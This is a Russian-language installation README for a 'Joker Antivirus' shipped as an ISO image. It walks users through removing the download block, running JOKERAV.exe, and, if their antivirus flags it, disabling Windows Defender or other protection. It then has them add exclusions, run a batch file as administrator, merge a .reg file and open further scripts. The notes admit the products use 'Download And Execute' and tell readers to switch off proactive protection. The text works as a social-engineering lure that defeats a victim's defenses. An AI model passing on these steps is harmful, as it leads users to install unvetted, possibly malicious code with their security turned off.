# Установка Joker Antivirus

Автором предлагается более «продвинутая версия» Joker антивируса,
упакованного в dll библиотеку. Выполнение данного антивируса происходит путём вызова функции `rundll32.exe`, сама функция не зависит от установленных в систему компонентов .Net Framework.

Программа распространяется в виде ISO образа диска. Для использования
программы необходимо подключить диск к вашей машине.

### Разблокировка образа, загруженого из Интернета

- Щёлкните правой кнопкой мыши на имени ISO образа.
- Выберите в контекстном меню пункт «Свойства».
- Перейдите на вкладку «Общие» открытого окна.
- Нажмите кнопку «Разблокировать».
- Нажмите кнопку «Ok».

### Подключение ISO диска в Windows 10

- Щёлкните правой кнопкой мыши на имени ISO образа.
- Выберите в контекстном меню пункт «Подключить».
- Откроется содержимое образа оптического диска

#### Что делать, если в контекстном меню нет этого пункта

- Щелкните правой клавишей мыши на имени ISO файла.
- Выберите в контекстном меню пункт «Открыть с помощью...»
- В появившемся окне выберите программу «Проводник» (Windows Ecplorer).
- Нажмите кнопку «Всегда» (в смысле всегда открывать этот тип файла в
  Проводнике Windows).
- Закройте появившееся окно с содержимом образа оптического диска.
- Теперь в контекстном меню файла появятся пункты: «Подключить»,
  «Записать ISO».

### Отключение ISO диска в Windows 10

1.  Откройте папку «Мой компьютер» («Этот компьютер») на компьютере.
2.  Найдите в нём букву примонтированного образа диска (D:, E: и так
    далее).
3.  Щёлкните по этому диску правой клавишей мыши.
4.  Выберите пункт контекстного меню «Извлечь». Буква диска исчезнет из
    папки «Мой компьютер».
5.  Если при извлечении образа диска возникнет ошибка, проверьте, не
    открыли ли вы какие-либо каталоги на этом диске, или не запустили ли
    вы с него программы.
6.  Повторите пункты 2.-4.

## Запуск программы

- В открытой папке примонтированного образа диска перейдите в каталог
  `x86`.
- Запустите ярлык программы `JOKERAV.exe` с изображением джокера.
- В случае возникновения ошибки запустите ярлык программы `JOKERAV.exe` с изображением джокера из папки `amd64` (версия программы для другой разрядности операционной системы).
- Смотрите вывод программы.

# Вывод программы

Программа выводит на экран окно Блокнота Windows с произвольным примерно на пять секунд, после чего закрывает этот файл и окно. В случае, если у вас не установлены необходимые исключения антивируса, окно не откроется, а будет вызвано сообщение вашего антивируса на присутствие в системе вредоносного файла. На самом деле этот файл — фейковый вирус, служащий только для проверки работы антивируса. Если у Вас произошло срабатывание антивируса, значит Ваш антивирус сконфигурирован неправильно. Обратитесь на сайт: [All-Defeat \| Main
(netip4.ru)](http://file.netip4.ru/PROGS/NIT/DefenderDefeat/html/main.html)
<http://file.netip4.ru/PROGS/NIT/DefenderDefeat/html/main.html>

В нормальном состоянии антивируса окна открываются и закрываются, ничего не делая в системе.

## Действия после работы антивируса

- Откройте каталог `doc` текущего диска.
- Дважды щёлкните на значке `ALLDEFE.url` для открытия веб-приложения.
- Отключите активную защиту вашего антивируса. В случае встроенного
  антивируса Windows Defender вы можете запустить скрипт `STOPDEF.js`
  или `STOPDEF.vbs` в папке *scripts* текущего образа диска для открытия соответствующей оснастки.
- Следуйте всем инструкциям мастера данного веб-приложения.
- ***Примечание***. Если вы по каким-то причинам не можете скачать файл с исключениями антивируса, этот файл вы всегда можете найти по пути doc\EXCL.txt` относительно корня образа диска.
- Запустите от имени администратора (щелчок правой клавишей мыши —
  «Запуск от имени администратора») файл `IEHARDEN.bat`. Дождитесь
  окончания выполнения.
- Двойным щелчком правой клавишей мыши запустите файл: `IESETDES.reg`.
  Согласитесь на вносимые изменения.
- Включите антивирус.
- Перезагрузите компьютер.
- Далее вы можете перейти на сайт установки других продуктов NIT и
  активации Microsoft Windows, дважды щёлкнув левой клавишей мыши на
  файле: `\scripts\IEDIST.js` относительно корня смонтированного файла
  образа.

# Замечания разработчиков

Образ будет пополняться новыми программами и скриптами. Следите за
анонсами.

Некоторое программное обеспечение может определяться как содержащее
вирусы. Это нормально, поскольку компания использует в своей продукции
технологию Download And Execute, которые очень не любят разработчики
антивирусного программного обеспечения. Просто отключайте проактивную
защиту антивируса, и включайте её после работы с образом диска. Смотрите также статьи: [Главная \| Статья
(netip6.ru)](http://nit.netip6.ru/articles01.shtml) , [Главная \| Статья
(netip6.ru)](http://nit.netip6.ru/articles03.shtml), [Главная \| Статья
(netip6.ru)](http://nit.netip6.ru/articles04.shtml).

Также полезные статьи о работе в Windows вы можете узнать на [Новости
(tilda.ws)](https://nit1969.tilda.ws/page48685607html).
